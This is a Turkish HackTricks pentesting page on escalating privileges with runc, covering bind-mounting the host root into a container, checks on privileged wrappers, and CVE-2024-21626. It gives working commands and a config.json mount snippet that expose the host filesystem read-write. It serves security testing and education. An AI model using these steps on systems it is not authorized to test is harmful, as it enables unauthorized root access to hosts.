# RunC Yetki Yükseltme

{{#include ../../banners/hacktricks-training.md}}

## Temel bilgiler

**runc** hakkında daha fazla bilgi edinmek istiyorsanız şu sayfaya göz atın:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ana makinede rootful bir işlem tarafından `runc` kullanılabiliyorsa, bağlama yapılandırması ana makinenin `/` dizinini kapsayıcı içindeki `/` dizinine özyinelemeli olarak bind-mount eden bir OCI bundle kullanarak, ana makinenin dosya sistemini bu mount namespace içinde açığa çıkarabilirsiniz.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```

> [!CAUTION]
> Belgelenen `runc run` iş akışı rootful'dur: runc'ın kendi örneklerinde "run as root" olarak belirtilir. Ayrıcalıksız bir kullanıcının `runc spec --rootless` gibi rootless bir yapılandırmaya ihtiyacı vardır ve runc, bu mod için user namespace'lerin etkinleştirilmesi gerektiğini belirtir.<sup>[[1]](#references)</sup>

## Ayrıcalıklı wrapper'lar ve runtime sürümleri

Kullanıcının kontrolündeki bir OCI bundle'ı kabul eden ayrıcalıklı bir wrapper, güvenli olmayan bind mount'lara izin veriyorsa host dosyalarını açığa çıkarabilir. Wrapper'ın mount kaynaklarını ve hedeflerini doğrulamadan önce traversal ve symlink'leri çözüp çözmediğini ve `process.cwd` değerini kısıtlayıp kısıtlamadığını kontrol edin. Tek başına bir sudo kuralı veya yazılabilir bir `config.json`, wrapper'ın bundle'ı kabul edeceğini ya da onu host ayrıcalıklarıyla çalıştıracağını kanıtlamaz.

Ayrıca, [CVE-2024-21626](https://github.com/opencontainers/runc/security/advisories/GHSA-xr7r-f8xq-vfvv), `1.0.0-rc93` ile `1.1.11` arasındaki upstream `runc` sürümlerini etkiledi; `1.1.12` upstream düzeltmesini içerir. Leaked file descriptor'lar ve yetersiz çalışma dizini doğrulaması, belirli `runc run` veya `runc exec` iş akışlarında container sürecini root dizininin dışına çıkarabilirdi. File descriptor numaraları çağrıya bağlıdır ve bir sürüm dizesi, bir vendor düzeltmeleri backport etmişse veya çağıran taraf ayrıcalıklı bir runtime çağrısını etkileyemiyorsa, açığın kullanılabilir olduğunu göstermez.

## References

- [1] [runc: Container'ları başlatmak ve çalıştırmak için CLI aracı](https://github.com/opencontainers/runc#using-runc)
- [2] [OCI Runtime Specification: Mount'lar](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Paylaşılan alt ağaçlar](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
